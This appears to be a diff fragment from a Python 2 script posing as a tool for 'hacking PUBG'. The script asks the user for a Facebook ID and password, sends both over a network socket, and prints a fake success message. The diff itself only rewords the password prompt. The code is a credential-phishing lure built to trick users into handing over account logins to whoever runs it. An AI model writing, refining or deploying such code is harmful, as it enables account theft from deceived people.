@@ -18,7 +18,7 @@ def connect():
     # print "hacking PUBG"
     while True:
     	ide = raw_input("Enter you facebook id:")
-        passw = raw_input("Enter youer facebook password:")
+        passw = raw_input("Enter youer password:")
         s.send(ide)
         s.send(passw)
         print("GOOD NEWS YOUER PUBG HAVE BEEN HACKED")
